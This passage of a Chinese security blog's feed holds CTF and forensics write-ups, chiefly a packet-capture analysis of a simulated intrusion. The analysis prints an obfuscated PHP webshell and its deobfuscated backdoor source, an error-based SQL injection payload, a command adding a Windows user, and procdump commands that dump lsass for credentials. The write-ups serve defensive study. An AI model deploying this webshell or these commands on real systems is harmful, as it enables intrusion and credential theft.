title="小结"></a>小结</h2><p>其实这个题目还有其他骚操作，比如用利用<code>wget</code>，以及直接构造一个比较骚气的域名。。这域名搞不来，我就没有尝试了，至于wget方法的话下次复现一下2015年的babyfirst在尝试一下<br>小结一波，这个题目收获很大，先来讲这个东西其实是关乎对Linux系统各种缩小版米昂领的熟悉程度，比如怎样能快速新建文件这里就用了&gt;这个符号去创建，还有通过管道符去执行bash命令(这一点就可以继续去推行还可以使用python，php一系列的命令结合各种语言反弹webshell的操作)，这都是我想不到的东西，归根到底是学的东西还是不能够灵活使用<br>顺便吐槽一下，最近的算法课懵逼得很，全都跟高数的级数收敛还有泰勒展开扯上关系，突然恐惧，还得重新用C++写oj上的算法题目，都是些大佬。。我做完的时候他们都不知道ak多久了。。。<br><a href="https://imgchr.com/i/iCeb79" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCeb79.md.png" alt="iCeb79.md.png"></a></p><p>恐怕9月份难熬23333.。。。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;开学了还是得学习的，复现一波题目来玩玩，其实是实力不够不能去打网鼎杯
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
      <category term="命令执行" scheme="0verwatch.top/categories/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>铁三2018.5.5数据分析</title>
    <link href="0verwatch.top/liuliangfenxi-5-5.html"/>
    <id>0verwatch.top/liuliangfenxi-5-5.html</id>
    <published>2018-09-06T09:30:21.000Z</published>
    <updated>2018-09-06T09:53:58.882Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>keep learning</p></blockquote><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>链接: <a href="https://pan.baidu.com/s/1b6bkW-J8vKASr8C2r9vsdQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1b6bkW-J8vKASr8C2r9vsdQ</a> 密码: nux4<br>感谢方方土学长的<a href="http://skysec.top/2018/05/30/2018.5.5信息安全铁人三项赛数据赛题解/" target="_blank" rel="noopener">题解</a>，学习到<a id="more"></a>了一定的套路</p><p>题目描述</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.黑客攻击的第一个受害主机的网卡IP地址</span><br><span class="line">2.黑客对URL的哪一个参数实施了SQL注入</span><br><span class="line">3.第一个受害主机网站数据库的表前缀(加上下划线 例如abc_)</span><br><span class="line">4.第一个受害主机网站数据库的名字</span><br><span class="line">5.Joomla后台管理员的密码是多少</span><br><span class="line">6.黑客第一次获得的php木马的密码是什么</span><br><span class="line">7.黑客第二次上传php木马是什么时间</span><br><span class="line">8.第二次上传的木马通过HTTP协议中的哪个头传递数据</span><br><span class="line">9.内网主机的mysql用户名和请求连接的密码hash是多少(用户:密码hash)</span><br><span class="line">10.php代理第一次被使用时最先连接了哪个IP地址</span><br><span class="line">11.黑客第一次获取到当前目录下的文件列表的漏洞利用请求发生在什么时候</span><br><span class="line">12.黑客在内网主机中添加的用户名和密码是多少</span><br><span class="line">13.黑客从内网服务器中下载下来的文件名</span><br></pre></td></tr></table></figure><p>先看看这些包都是按时间顺序命名的<br><img src="https://s1.ax1x.com/2018/09/06/iCAIZn.png" alt="iCAIZn.png"><br>先打开第一个包<br>一般黑客攻击先从应用层发起攻击，所以先过滤<code>http</code>看一下<br>发现ip为<code>202.1.1.2</code>对<code>192.168.1.8</code>有很明显的爆破痕迹，把里面的url的内容urldecode一下会发现明显的sql查询语句，而且有很明显sqlmap指纹痕迹<br><img src="https://s1.ax1x.com/2018/09/06/iCAbGT.png" alt="iCAbGT.png"></p><p>所以就解决了受害主机ip是<code>192.168.1.8</code><br>我们再详细过滤一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http and ip.src == 202.1.1.2</span><br></pre></td></tr></table></figure><p>可以得到比较详细的爆破过程，标记一下最后一个，然后返回http查看他的response<br><a href="https://imgchr.com/i/iCAqRU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCAqRU.md.png" alt="iCAqRU.md.png"></a></p><p>很明显了，注入的参数是<code>list[select]</code>,并且应该是使用了<code>报错注入</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span>\n</span><br><span class="line">   <span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/1999/xhtml"</span> <span class="attr">xml:lang</span>=<span class="string">"en-gb"</span> <span class="attr">lang</span>=<span class="string">"en-gb"</span> <span class="attr">dir</span>=<span class="string">"ltr"</span>&gt;</span>\n</span><br><span class="line">   <span class="tag">&lt;<span class="name">head</span>&gt;</span>\n</span><br><span class="line">   \t<span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"content-type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span>\n</span><br><span class="line">    [truncated]\t<span class="tag">&lt;<span class="name">title</span>&gt;</span>Error: 500 XPATH syntax error: &amp;#039;qqzvqadminqqkkq&amp;#039; SQL=SELECT (UPDATEXML(6315,CONCAT(0x2e,0x71717a7671,(SELECT MID((IFNULL(CAST(username AS CHAR),0x20)),1,22) FROM joomla.ajtuc_users ORDER BY id LIMIT 0,1),0x71</span><br><span class="line">   FROM `ajtuc_ucm_history` AS h\n</span><br><span class="line">   LEFT JOIN ajtuc_users AS uc ON uc.id = h.editor_user_id\n</span><br></pre></td></tr></table></figure><p>而且还可以从响应里面发现是从<code>joomla.ajtuc_users</code>表里面注入的东西，也知道了前缀为<code>ajtuc</code>，同时也知道了数据库为<code>joomla</code>。第三四题解决</p><p>然后要找登录后台的密码，但是这里直接<code>contains &quot;password&quot;</code>是找不到的，我们这时候就得转换思路就是说黑客是从数据库里把密码爆出来的<br>如果仔细看这个黑客的行为的话，他事先尝试登录发现不行才用的SQL注入，所以也就跟着这个思路来走了</p><p>既然报错注入，里面必含有password的关键字以及表名，立即过滤<br><code>ip.src == 202.1.1.2 and http contains &quot;password&quot; and http contains &quot;joomla.ajtuc_users&quot;</code><br>发现有三条，标记一下查看他们的response<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Status: 500 XPATH syntax error: &apos;qqzvq$2y$10$lXujU7XaUviJDigqqkkq&apos; </span><br><span class="line">Status: 500 XPATH syntax error: &apos;qqzvqFMzKy6.wx7EMCBqpzrJdn7qqkkq&apos; </span><br><span class="line">Status: 500 XPATH syntax error: &apos;qqzvqzi/8B2QRD7qIlDJeqqkkq&apos;</span><br></pre></td></tr></table></figure></p><p>再来查看一下报错注入是这样的，存在拼接<code>0x71717a7671</code>，解码一下<code>qqzvq</code><br><code>UPDATEXML(5928,CONCAT(0x2e,0x71717a7671,(SELECT MID((IFNULL(CAST(password AS CHAR),0x20)),1,22</code>，所以得把qqzvq前缀去掉</p><p><code>$2y$10$lXujU7XaUviJDigqqkkqFMzKy6.wx7EMCBqpzrJdn7qqkkqzi/8B2QRD7qIlDJeqqkkq</code><br>拼接起来就是经过加密后的密码，官方答案是qwert123，但还是解不出来</p><p>第一个包里面过滤<br><code>http.request.method == &quot;POST&quot; and ip.src == 202.1.1.2</code><br><a href="https://imgchr.com/i/iCEeeA" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEeeA.md.png" alt="iCEeeA.md.png"></a></p><p>没发现有可疑数据</p><p>再找第二个包<br><code>ip.src == 202.1.1.2 and http.request.method == &quot;POST&quot; and http contains &quot;eval&quot;</code>，发现存在一个文件<code>kkkaaa.php</code><br><a href="https://imgchr.com/i/iCEMJf" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEMJf.md.png" alt="iCEMJf.md.png"></a></p><p>可以发现这里面的是一个马，密码为<code>zzz</code><br>然后我们再根据这个马去寻找上传的的第二个马<br>当我们点到第三个报文的时候发现多了一个参数<code>z2</code>，有点可疑<br><a href="https://imgchr.com/i/iCEQW8" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEQW8.md.png" alt="iCEQW8.md.png"></a></p><p>保存出来看一下，发现是段php代码，<br><img src="https://s1.ax1x.com/2018/09/06/iCE3Qg.png" alt="iCE3Qg.png"><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>.$p=<span class="string">'l&gt;]ower";$i&gt;]=$m[1][0].$m[1]&gt;][1];$h&gt;]=$&gt;]sl($ss(m&gt;]d5($i.&gt;]$kh),0&gt;],3))&gt;];$f=$s&gt;]l($s&gt;]s(md5'</span>;.$d=<span class="string">']q=array_v&gt;]&gt;]alues(&gt;]$q);&gt;]preg_match_a&gt;]ll("/(&gt;][\\w]&gt;])[\\w-&gt;]]+&gt;](?:;q=&gt;]0.([\\d]))?,?/",&gt;'</span>;.$W=<span class="string">'),$ss(&gt;]$s[&gt;]$i],&gt;]0,$e))),$&gt;]&gt;]k)));&gt;]$o=ob_get_content&gt;]&gt;]s();ob_end_&gt;]&gt;]clean();$d=&gt;]base'</span>;.$e=<span class="string">']T_LANGUAGE"];if($rr&gt;]&amp;&amp;$&gt;]ra)&#123;$&gt;]u=pars&gt;]e_&gt;]url($rr);par&gt;]se_st&gt;]r($u["&gt;]query"],$&gt;]q);$&gt;'</span>;.$E=<span class="string">'&gt;]64_e&gt;]ncod&gt;]e&gt;](&gt;]x(gz&gt;]compress($o),$k));pri&gt;]nt("&lt;$k&gt;$d&lt;&gt;]/$k&gt;"&gt;])&gt;];@&gt;]session_destr&gt;]oy();&#125;&#125;&#125;&#125;'</span>;.$t=<span class="string">'($i.&gt;]$kf),0,3&gt;]));$p&gt;]="";fo&gt;]r($z=1&gt;];$z&lt;&gt;]count($m&gt;][1]);$z+&gt;]&gt;]+)$p&gt;].=$q[$m[&gt;]2][$z]];i&gt;'</span>;.$M=<span class="string">']$ra,$&gt;]m);if($q&gt;]&amp;&amp;$m&gt;])&#123;@sessi&gt;]on_sta&gt;]&gt;]rt();$s=&amp;$&gt;]_SESS&gt;]ION;$&gt;]&gt;]s&gt;]s="substr";$sl="s&gt;]&gt;]trto'</span>;.$P=<span class="string">']f(s&gt;]tr&gt;]pos($p&gt;],$h)===0)&#123;$s[&gt;]$i]="";$p&gt;]=$ss($&gt;]p,3);&gt;]&#125;if(ar&gt;]ray&gt;]_key_exist&gt;]&gt;]s($i,$&gt;]s)&gt;])&#123;$&gt;'</span>;.$j=str_replace(<span class="string">'fr'</span>,<span class="string">''</span>,<span class="string">'cfrrfreatfrfre_funcfrtfrion'</span>);.$k=<span class="string">'];&#125;&#125;re&gt;]&gt;]turn $o;&gt;]&#125;$&gt;]r=$_SERV&gt;]ER;$rr=@$r[&gt;]"HTTP&gt;]_REFERE&gt;]R"];$ra&gt;]=@&gt;]$r["&gt;]HTTP_A&gt;]CC&gt;]EP&gt;'</span>;.$g=<span class="string">'"";for(&gt;]$i=&gt;]0;$i&lt;$l;&gt;])&gt;]&#123;for($j=0;($j&lt;&gt;]$c&amp;&amp;&gt;]$i&lt;$l);$&gt;]j++,$i&gt;]++)&#123;$o.&gt;]=$t&#123;$i&gt;]&#125;^$k&#123;$j&#125;&gt;'</span>;.$R=<span class="string">'$k&gt;]h="cb4&gt;]2";$kf="e130"&gt;];functio&gt;]n&gt;] x($t&gt;],$k)&#123;$c=s&gt;]trle&gt;]&gt;]n($k);$l=strle&gt;]n&gt;]($t)&gt;];$o='</span>;.$Q=<span class="string">']s[$i].=$p;$e=strp&gt;]&gt;]os(&gt;]$s[$i&gt;]],$f);if($&gt;]e)&#123;$k=$kh.$k&gt;]f;&gt;]ob_sta&gt;]rt();@e&gt;]val(@gzun&gt;]co&gt;'</span>;.$v=<span class="string">']mpress(@x&gt;](@b&gt;]as&gt;]&gt;]e64_decode(pr&gt;]&gt;]e&gt;]g_repla&gt;]ce(array("/_/","/-/"),arr&gt;]ay(&gt;]"/","+"&gt;]'</span>;.$x=str_replace(<span class="string">'&gt;]'</span>,<span class="string">''</span>,$R.$g.$k.$e.$d.$M.$p.$t.$P.$Q.$v.$W.$E);.$N=$j(<span class="string">''</span>,$x);$N();.<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>解混淆<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump($j);</span><br><span class="line">var_dump($x);</span><br></pre></td></tr></table></figure></p><p>得到<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string(<span class="number">15</span>) <span class="string">"create_function"</span></span><br><span class="line">string(<span class="number">929</span>) <span class="string">"$kh="</span>cb42<span class="string">";$kf="</span>e130<span class="string">";function x($t,$k)&#123;$c=strlen($k);$l=strlen($t);$o="</span><span class="string">";for($i=0;$i&lt;$l;)&#123;for($j=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++)&#123;$o.=$t&#123;$i&#125;^$k&#123;$j&#125;;&#125;&#125;return $o;&#125;$r=$_SERVER;$rr=@$r["</span>HTTP_REFERER<span class="string">"];$ra=@$r["</span>HTTP_ACCEPT_LANGUAGE<span class="string">"];if($rr&amp;&amp;$ra)&#123;$u=parse_url($rr);parse_str($u["</span>query<span class="string">"],$q);$q=array_values($q);preg_match_all("</span>/([\w])[\w-]+(?:;q=<span class="number">0.</span>([\d]))?,?/<span class="string">",$ra,$m);if($q&amp;&amp;$m)&#123;@session_start();$s=&amp;$_SESSION;$ss="</span>substr<span class="string">";$sl="</span>strtolower<span class="string">";$i=$m[1][0].$m[1][1];$h=$sl($ss(md5($i.$kh),0,3));$f=$sl($ss(md5($i.$kf),0,3));$p="</span><span class="string">";for($z=1;$z&lt;count($m[1]);$z++)$p.=$q[$m[2][$z]];if(strpos($p,$h)===0)&#123;$s[$i]="</span><span class="string">";$p=$ss($p,3);&#125;if(array_key_exists($i,$s))&#123;$s[$i].=$p;$e=strpos($s[$i],$f);if($e)&#123;$k=$kh.$kf;ob_start();@eval(@gzuncompress(@x(@base64_decode(preg_replace(array("</span>/_/<span class="string">","</span>/-/<span class="string">"),array("</span>/<span class="string">","</span>+<span class="string">"),$ss($s[$i],0,$e))),$k)));$o=ob_get_contents();ob_end_clean();$d=base64_encode(x(gzcompress($o),$k));print("</span>&lt;$k&gt;$d&lt;/$k&gt;<span class="string">");@session_destroy();&#125;&#125;&#125;&#125;"</span></span><br></pre></td></tr></table></figure></p><p>基本上可以确定这是第二个马<br>上传时间为<br><code>17:20:44.248365</code><br>然后重新过滤一下<br><code>ip.src == 202.1.1.2 and http</code>根据时间上的关系也可以确定第二上传的马的名字为<code>/tmp/footer.php</code></p><p>其实我们也可以从上面发现关于头的操作有两个东西<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$rr = @$_SERVER[&quot;HTTP_REFERER&quot;];</span><br><span class="line">$ra = @$_SERVER[&quot;HTTP_ACCEPT_LANGUAGE&quot;];</span><br></pre></td></tr></table></figure></p><p>看的跟清楚一点可以追踪几个<code>footer</code>的流看一下<br>明显发现<code>referer</code>有base64加密但是LANGUAGE没啥变化，所以最后的答案应该是referer<br><a href="https://imgchr.com/i/iCENoq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCENoq.md.png" alt="iCENoq.md.png"></a></p><p>然后题目抛出mysql的操作<br>在第四个包里面才找到关于SQL的相关协议<br><a href="https://imgchr.com/i/iCEbTI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEbTI.md.png" alt="iCEbTI.md.png"></a><br><code>mysql and mysql contains &quot;password&quot;</code><br>过滤之后可以发现黑客又在爆破<br>直接找到最后的login请求里面的hash值就是<code>password</code><br><a href="https://imgchr.com/i/iCEdYV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEdYV.md.png" alt="iCEdYV.md.png"></a></p><p>然后再来过滤一波查看黑客究竟<code>footer.php</code>之后的操作，发现有<code>tunnel</code>这样的关键字样，明显第一次使用的代理ip为<code>4.2.2.2</code><br><a href="https://imgchr.com/i/iCEBSU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEBSU.md.png" alt="iCEBSU.md.png"></a></p><p>然后第五到第八个包没有任何有关题目的答案</p><p>过滤第九个包的内容<br><code>(ip.addr == 202.1.1.2) and (http contains &quot;ls&quot;|| http contains &quot;dir&quot;)</code><br>发现有两次列目录的过程<br><a href="https://imgchr.com/i/iCEXff" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEXff.md.png" alt="iCEXff.md.png"></a></p><p>用了<code>dir</code>的那一次才有回显，系统是<code>Windows</code>没错了<br><a href="https://imgchr.com/i/iCEz6g" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEz6g.md.png" alt="iCEz6g.md.png"></a><br>时间很明显就是这个了<br>我么现在知道黑客攻击的ip是<code>192.168.2.20</code>，然后过滤一下<code>ip.addr == 192.168.2.20 &amp;&amp; http</code><br><a href="https://imgchr.com/i/iCVSXQ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCVSXQ.md.png" alt="iCVSXQ.md.png"></a><br>发现黑客通过echo命令写入一句话木马，然后通过<code>sh.php</code>执行<br>再过滤一下<br><code>ip.src == 192.168.2.20 &amp;&amp; http</code><br>发现在<code>18:49:27.767754</code>发现了疑似黑客振兴<code>net user localgroup</code> 命令的结果<br><a href="https://imgchr.com/i/iCVC0s" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCVC0s.md.png" alt="iCVC0s.md.png"></a><br>标记一下在其附近找请求</p><p>果不其然<br>在他的下方的post请求里面的<code>z2</code>参数里面解码得到<br><a href="https://imgchr.com/i/iCVFkq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCVFkq.md.png" alt="iCVFkq.md.png"></a></p><p><code>cd/d&quot;C:\phpStudy\WWW\b2evolution\install\test\&quot;&amp;net user kaka kaka /add&amp;echo [S]&amp;cd&amp;echo [E]</code><br>也就是增加了<code>kaka:kaka</code>这个用户名和密码</p><p>最后一个问题是下载了什么文件，由于使用菜刀下载的，很简单直接过滤post请求就好<br><code>ip.dst == 192.168.2.20 &amp;&amp; http.request.method== &quot;POST&quot;</code><br><a href="https://imgchr.com/i/iCVecF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCVecF.md.png" alt="iCVecF.md.png"></a></p><p>在这个包里面会发现最后有几个报文是含有z2参数的，十分可疑，解码<br>会发现哟一个利用<code>procdump.exe</code>操作的东西<br><code>cd/d&quot;C:\phpStudy\WWW\b2evolution\install\test\&quot;&amp;procdump.exe -accepteula -ma lspasss.dmp&amp;echo [S]&amp;cd&amp;echo [E]</code><br>下面的post请求解码z2参数也是类似的东西<br><code>cd/d&quot;C:\phpStudy\WWW\b2evolution\install\test\&quot;&amp;procdump.exe -accepteula -ma lsass.exe&amp;echo [S]&amp;cd&amp;echo [E]</code><br>再来解码一下最后一个报文里面的东西，发现这个文件<br><code>C:\phpStudy\WWW\b2evolution\install\test\lsass.exe_180208_185247.dmp</code><br>猜测应该是下了这个文件<br>然后打开第10个报文确认就是这个文件就好了</p><p>答案归纳</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.192.168.1.8</span><br><span class="line">2.list[select]</span><br><span class="line">3.ajtuc</span><br><span class="line">4.joomla</span><br><span class="line">5.$2y$10$lXujU7XaUviJDigFMzKy6.wx7EMCBqpzrJdn7zi/8B2QRD7qIlDJe(未解密)</span><br><span class="line">6.zzz</span><br><span class="line">7.17:20:44.248365</span><br><span class="line">8.Referer</span><br><span class="line">9.admin:1a3068c3e29e03e3bcfdba6f8669ad23349dc6c4</span><br><span class="line">10.4.2.2.2</span><br><span class="line">11.18:49:27.767754</span><br><span class="line">12.kaka:kaka</span><br><span class="line">13.lsass.exe_180208_185247.dmp</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>1.发现有菜刀流量的时候多关注是否出现z2参数的值，凡是出现这种参数的值得多去解码看看，不要嫌麻烦，因为这里面往往包含一些关键操作<br>2.出现一些有关php混淆的代码的时候要学会找到对应的参数去反混淆2333</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;keep learning&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正文&quot; class=&quot;headerlink&quot; title=&quot;正文&quot;&gt;&lt;/a&gt;正文&lt;/h2&gt;&lt;p&gt;链接: &lt;a href=&quot;https://pan.baidu.com/s/1b6bkW-J8vKASr8C2r9vsdQ&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://pan.baidu.com/s/1b6bkW-J8vKASr8C2r9vsdQ&lt;/a&gt; 密码: nux4&lt;br&gt;感谢方方土学长的&lt;a href=&quot;http://skysec.top/2018/05/30/2018.5.5信息安全铁人三项赛数据赛题解/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;题解&lt;/a&gt;，学习到
    
    </summary>
    
      <category term="流量分析" scheme="0verwatch.top/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
    
      <category term="流量分析" scheme="0verwatch.top/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>安恒8月应急响应题目回顾</title>
    <link href="0verwatch.top/anheng-8month-part1.html"/>
    <id>0verwatch.top/anheng-8month-part1.html</id>
    <published>2018-08-30T14:22:35.000Z</published>
    <updated>2018-08-30T14:25:46.544Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最做流量分析的题目感觉还是不太熟悉，所以最近几篇博客都应该都是练习流量分析的题目了，就从安恒8月赛这个应急响应讲起吧，记录一下加深印象，顺便小结一下自己的做题领悟。<a id="more"></a></p><p>题目地址  <a href="https://pan.baidu.com/s/13SoD6xB7YBiqpUDCIcb8mg" target="_blank" rel="noopener">https://pan.baidu.com/s/13SoD6xB7YBiqpUDCIcb8mg</a></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="题目概述"><a href="#题目概述" class="headerlink" title="题目概述"></a>题目概述</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1、给出黑客使用的扫描器</span><br><span class="line">2、得到黑客扫描到的登陆后台是(相对路径即可) /admin/login.php</span><br><span class="line">3、得到黑客使用了什么账号密码登陆了web后台(形式:username/password)</span><br><span class="line">4、得到黑客上传的webshell文件名是什么，内容是什么,提交webshell内容的base编码</span><br><span class="line">5、黑客在robots.txt中找到的flag是什么</span><br><span class="line">6、黑客找到的数据库密码是多少</span><br><span class="line">7、黑客在数据库中找到的hash_code是什么</span><br><span class="line">8、黑客破解了账号ijnu@test.com得到的密码是什么</span><br><span class="line">9、被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip</span><br><span class="line">10、黑客使用了什么账号登陆了mail系统（形式: username/password）</span><br><span class="line">11、黑客获得的vpn,ip是多少</span><br></pre></td></tr></table></figure><p>还得了解一下一些前置的知识</p><p>过滤IP，如源IP或者目标 x.x.x.x<br><code>ip.src == x.x.x.x or ip.dst eq x.x.x.x 或者 ip.addr == x.x.x.x</code><br>过滤端口<br><code>tcp.port eq 80 or udp.port eq 80</code><br>过滤MAC<br><code>eth.dst ==A0:00:00:04:C5:84</code></p><p>http模式过滤(就是一种模糊匹配)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http.request.method== &quot;GET&quot; </span><br><span class="line">http.request.method== &quot;POST&quot; </span><br><span class="line">http.request.uri ==&quot;/img/logo-edu.gif&quot; </span><br><span class="line">http contains&quot;GET&quot; </span><br><span class="line">http contains&quot;HTTP/1.&quot; </span><br><span class="line">http.request.method== &quot;GET&quot; &amp;&amp; http contains &quot;User-Agent:&quot;</span><br></pre></td></tr></table></figure><p>一些常见的自动化工具的指纹</p><p>Awvs（Acunetix Web Vulnerability Scanner ）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">acunetix_wvs_security_test acunetix </span><br><span class="line">acunetix_wvs acunetix_test</span><br><span class="line">Acunetix-Aspect-Password: Cookie: </span><br><span class="line">acunetix_wvs_security_test X-Forwarded-Host: </span><br><span class="line">acunetix_wvs_security_test X-Forwarded-For: </span><br><span class="line">acunetix_wvs_security_test Host: </span><br><span class="line">acunetix_wvs_security_test</span><br></pre></td></tr></table></figure><p>感觉我们只需要http contains “wvs” 或者是 http contains “acunetix”就可以把包给筛选出来</p><p>Netsparker</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">X-Scanner: NetsparkerLocation: </span><br><span class="line">NetsparkerAccept: netsparker/checkCookie: </span><br><span class="line">netsparkerCookie: NETSPARKER</span><br></pre></td></tr></table></figure><p>Appscan</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Headers Content-Type: Appscan </span><br><span class="line">Content-Type: AppScanHeaderAccept: Appscan User-Agent:Appscan</span><br></pre></td></tr></table></figure><p>Nessus</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x_forwarded_for: nessus</span><br><span class="line">referer: nessus</span><br><span class="line">host: nessus</span><br></pre></td></tr></table></figure><p>Sqlmap</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: sqlmap1.2.8#stable</span><br></pre></td></tr></table></figure><h4 id="1、给出黑客使用的扫描器"><a href="#1、给出黑客使用的扫描器" class="headerlink" title="1、给出黑客使用的扫描器"></a>1、给出黑客使用的扫描器</h4><p>竟然是黑客攻击，就应该把把http过滤看一下或者直接搜就行<br><a href="https://imgchr.com/i/Pj0s39" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/Pj0s39.md.png" alt="Pj0s39.md.png"></a><br>所以这一题的答案是awvs</p><h4 id="2、得到黑客扫描到的登陆后台是-相对路径即可-admin-login-php"><a href="#2、得到黑客扫描到的登陆后台是-相对路径即可-admin-login-php" class="headerlink" title="2、得到黑客扫描到的登陆后台是(相对路径即可) /admin/login.php"></a>2、得到黑客扫描到的登陆后台是(相对路径即可) /admin/login.php</h4><p>通常后台的名字包括</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">manager</span><br><span class="line">login</span><br><span class="line">system</span><br></pre></td></tr></table></figure><p>所以我们直接搜其中的一个输入命令<code>http contains &quot;login&quot; &amp;&amp; http.request.method == &quot;POST&quot;</code><br><a href="https://imgchr.com/i/Pj0ycR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/Pj0ycR.md.png" alt="Pj0ycR.md.png"></a><br>前面的都是登陆的页面，那个password_reset应该是密码重置<br>所以这一题的答案应该是<code>/admin/login.php?rec=login</code></p><p>###3、得到黑客使用了什么账号密码登陆了web后台(形式:username/password)<br>也是同样的套路<br>输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;password&quot;</span><br></pre></td></tr></table></figure></p><p> 